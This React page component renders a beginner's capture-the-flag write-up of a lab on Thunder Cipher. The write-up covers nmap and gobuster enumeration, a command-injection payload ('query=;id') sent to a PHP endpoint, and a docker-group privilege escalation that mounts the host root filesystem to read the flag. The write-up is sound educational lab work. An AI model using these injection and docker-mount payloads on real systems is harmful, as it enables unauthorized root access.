import { Link } from 'react-router-dom';
import { ArrowLeft, Terminal, Award, ExternalLink, Hash } from 'lucide-react';

const LocalRoot = () => {
  return (
    <div className="min-h-screen text-slate-300 font-sans selection:bg-aurora-violet selection:text-white pb-20">

      {/* Navigation Bar */}
      <nav className="fixed w-full top-0 z-50 pt-4">
        <div className="container mx-auto px-6 flex justify-between items-center">
          <Link
            to="/"
            className="glass-pill px-4 py-2 text-white/85 hover:text-white transition-colors font-mono-tight text-xs uppercase tracking-[0.22em] flex items-center gap-2"
            data-cursor="hover"
          >
            <ArrowLeft size={14} /> return_home
          </Link>
          <span className="glass-pill px-3 py-1.5 text-[10px] font-mono-tight text-aurora-cyan uppercase tracking-[0.22em]">
            MISSION_ID · LOCALROOT
          </span>
        </div>
      </nav>

      {/* Main Content */}
      <article className="container mx-auto px-4 pt-32 pb-10 max-w-3xl">
        
        {/* Header */}
        <header className="mb-12 text-center">
          <h1 className="text-3xl md:text-5xl font-bold text-white mb-6 tracking-tight">
            How I accidentally became <span className="text-blue-500">Root</span> via Docker
          </h1>
          <div className="flex flex-wrap justify-center gap-3 text-sm font-mono text-slate-500">
            <span className="bg-slate-900 px-3 py-1 rounded border border-slate-800">Platform: Thunder Cipher</span>
            <span className="bg-slate-900 px-3 py-1 rounded border border-slate-800">Difficulty: Medium</span>
            <span className="bg-slate-900 px-3 py-1 rounded border border-slate-800">Time: ~2 Hours</span>
          </div>
        </header>

        {/* Story Body */}
        <div className="prose prose-invert prose-lg max-w-none text-slate-300">
          
          {/* Disclaimer / Intro */}
          <div className="bg-blue-900/10 border border-blue-500/20 rounded-lg p-4 mb-10 text-sm text-slate-400">
            <strong>Author's Note:</strong> Hey everyone, this is my first ever writeup! I'm still learning the ropes, so if there are any typos or if I explained something weirdly, please don't mind me. Just wanted to share how I solved this cool lab on <a href="https://thundercipher.tech" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">thundercipher.tech</a>.
          </div>

          {/* Challenge Description */}
          <div className="bg-slate-900 border-l-4 border-slate-700 p-6 mb-12 italic text-slate-400 text-sm">
            <h4 className="text-slate-200 font-bold not-italic mb-2 text-xs uppercase tracking-wider">Official Challenge Description</h4>
            "A city-facing service runs quietly in the background, appearing ordinary but hiding a subtle weakness that allows deeper interaction than intended. Once inside, the environment reveals layered components where separation between services is weaker than it looks. Careful exploration and smart abuse of this setup can lead you from a simple foothold to complete control of the system."
          </div>

          {/* Step 1: Recon */}
          <h3 className="text-2xl font-bold text-white mt-12 mb-4 flex items-center gap-3">
            <span className="bg-blue-600 text-xs px-2 py-1 rounded">STEP 1</span>
            Reconnaissance (The Nmap Scan)
          </h3>
          <p>
            I started with a basic Nmap scan to see what I was dealing with. The scan returned 5 open ports, which gave me a few places to start poking around.
          </p>
          <div className="bg-black rounded-lg p-4 font-mono text-sm border border-slate-800 my-4">
            <div className="text-green-400">$ nmap -sC -sV 192.168.5.109</div>
            <div className="text-slate-400 mt-2">
              PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;&nbsp;SERVICE<br/>
              21/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;ftp<br/>
              22/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;ssh<br/>
              80/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;http (Apache)<br/>
              3306/tcp&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;mysql<br/>
              8000/tcp&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;http-alt (Nginx)
            </div>
          </div>
          <p>
            So we had FTP, SSH, Database, and two Web Servers (80 and 8000). I decided to check them one by one.
          </p>

          {/* Step 2: Enumeration */}
          <h3 className="text-2xl font-bold text-white mt-12 mb-4 flex items-center gap-3">
            <span className="bg-blue-600 text-xs px-2 py-1 rounded">STEP 2</span>
            Checking the Doors (Enumeration)
          </h3>
          
          <ul className="space-y-4 list-none pl-0">
            <li className="flex gap-3">
              <div className="mt-1 min-w-[20px]"><Hash size={18} className="text-slate-500" /></div>
              <div>
                <strong className="text-white">FTP (Port 21):</strong> I tried logging in as <code>anonymous</code> and it worked! I found a note file. I got excited thinking it was the password, but it turned out to be a dead end (a "rabbit hole").
              </div>
            </li>
            <li className="flex gap-3">
              <div className="mt-1 min-w-[20px]"><Hash size={18} className="text-slate-500" /></div>
              <div>
                <strong className="text-white">SSH & MySQL (22 & 3306):</strong> I tried connecting, but without a password or valid credentials, I was locked out.
              </div>
            </li>
            <li className="flex gap-3">
              <div className="mt-1 min-w-[20px]"><Hash size={18} className="text-slate-500" /></div>
              <div>
                <strong className="text-white">Web Servers (80 & 8000):</strong> Port 80 was just a default Apache page. But Port 8000 was interesting it was running Nginx.
              </div>
            </li>
          </ul>

          <p className="mt-6">
            Since the ports themselves weren't giving up much, I ran <strong>Gobuster</strong> on both web ports to find hidden files.
          </p>
          <div className="bg-slate-900 p-4 rounded-lg font-mono text-sm border border-slate-700">
            <div className="text-slate-500"># Scanning Port 8000</div>
            <div className="text-white">gobuster dir -u http://192.168.5.109:8000 -w common.txt -x php,txt,sh</div>
          </div>
          <p className="mt-4">
            This was the breakthrough. Gobuster found two interesting files:
            <br/>1. <code>.bashrc</code> (Usually a system file?)
            <br/>2. <code>test.php</code> (This looked super suspicious)
          </p>

          {/* Step 3: Exploitation */}
          <h3 className="text-2xl font-bold text-white mt-12 mb-4 flex items-center gap-3">
            <span className="bg-blue-600 text-xs px-2 py-1 rounded">STEP 3</span>
            Breaking the Script
          </h3>
          <p>
            I opened <code>test.php</code> in my browser. It was a blank page, but when I tried to interact with it, it gave me an error: <em>"Please POST a proper query."</em>
          </p>
          <p>
            This told me two things:
            <br/>1. It needs a POST request (not GET).
            <br/>2. The parameter name is likely <code>query</code>.
          </p>
          <p>
            I realized the script was probably taking my input and running a command on the server (maybe `curl` to fetch a website?). I decided to try <strong>Command Injection</strong> using a semicolon <code>;</code>.
          </p>

          <div className="bg-slate-900 rounded-lg p-5 border border-slate-700 my-6 font-mono text-sm shadow-xl">
            <div className="flex items-center gap-2 text-slate-500 mb-3 border-b border-slate-800 pb-2">
              <Terminal size={14} /> My Terminal Payload
            </div>
            <div className="grid gap-2">
              <div>
                <span className="text-purple-400">Command:</span> <span className="text-green-400">curl -X POST -d "query=;id" http://.../test.php</span>
              </div>
              <div className="text-slate-500 text-xs mt-1">
                // Logic: "Finish your previous command (;), and then run 'id' for me."
              </div>
              <div className="mt-2 pt-2 border-t border-slate-800 border-dashed">
                <span className="text-blue-400">Server Response:</span> <span className="text-white">uid=1001(apiuser) gid=1001(apiuser)</span>
              </div>
            </div>
          </div>

          <p>
            It worked! The server executed my command. This gave me the answer to the first question of the challenge:
          </p>

          {/* Q1 Answer Card */}
          <div className="bg-green-900/10 border border-green-500/20 p-4 rounded-lg mb-8 flex items-center justify-between">
            <span className="text-sm text-green-400 font-bold">Question 1: What is the username you initially gained access as?</span>
            <span className="bg-green-500 text-black text-xs font-bold px-2 py-1 rounded">apiuser</span>
          </div>

          {/* Step 4: Docker Esc */}
          <h3 className="text-2xl font-bold text-white mt-12 mb-4 flex items-center gap-3">
            <span className="bg-blue-600 text-xs px-2 py-1 rounded">STEP 4</span>
            The "Docker" Mistake (Privilege Escalation)
          </h3>
          <p>
            I was in, but I wasn't Root yet. I checked my user details again and noticed something critical:
            <br/><code>groups=1001(apiuser),115(docker)</code>
          </p>
          
          <p>
            Being in the <strong>docker</strong> group is dangerous. It means I can talk to the Docker Daemon, which runs as Root. I didn't need a password; I just needed to tell Docker to run a container and mount the host's hard drive.
          </p>
          <p>
            I sent this final payload to the server:
          </p>

          <div className="bg-black rounded-lg p-4 my-6 font-mono text-sm border border-slate-800 overflow-x-auto">
            <span className="text-blue-500">Payload:</span> query=;docker run -v /:/mnt ubuntu cat /mnt/root/root.txt
          </div>

          <p>
            <strong>Breakdown:</strong>
            <br/>1. <code>docker run ... ubuntu</code>: Start an Ubuntu container.
            <br/>2. <code>-v /:/mnt</code>: Take the <strong>entire server hard drive</strong> (/) and plug it into the container at <code>/mnt</code>.
            <br/>3. <code>cat /mnt/root/root.txt</code>: Read the secret flag.
          </p>
          <p>
            Docker obeyed, and the flag printed out on my screen.
          </p>

          {/* Q2 Answer Card */}
          <div className="bg-green-900/10 border border-green-500/20 p-4 rounded-lg mb-8 flex items-center justify-between">
            <span className="text-sm text-green-400 font-bold">Question 2: What is the root flag?</span>
            <span className="bg-green-500 text-black text-xs font-bold px-2 py-1 rounded">SOLVED</span>
          </div>

          {/* Certificate Section */}
          <div className="mt-16">
            <h4 className="text-white font-bold text-lg mb-4 flex items-center gap-2">
              <Award className="text-yellow-500" size={20} /> Proof of Pwn
            </h4>
            <div className="bg-slate-900 p-2 rounded-xl border border-slate-800 shadow-2xl">
              <img 
                src="/localroot-cert.jpeg" 
                alt="LocalRoot Capture The Flag Certificate" 
                className="rounded-lg w-full object-cover opacity-90 hover:opacity-100 transition-opacity"
              />
              <div className="text-center pt-3 pb-1 flex justify-center items-center gap-2">
                <p className="text-xs font-mono text-slate-500">
                  Challenge Completed on 
                </p>
                <a href="https://thundercipher.tech" target="_blank" rel="noopener noreferrer" className="text-xs font-mono text-blue-500 hover:text-blue-400 flex items-center gap-1">
                  Thunder Cipher <ExternalLink size={10} />
                </a>
              </div>
            </div>
          </div>

        </div>

        <div className="mt-20 text-center border-t border-slate-800 pt-10">
          <Link to="/" className="inline-flex items-center gap-2 text-slate-500 hover:text-white transition-colors">
            <ArrowLeft size={16} /> Return to Portfolio
          </Link>
        </div>

      </article>
    </div>
  );
};

export default LocalRoot;
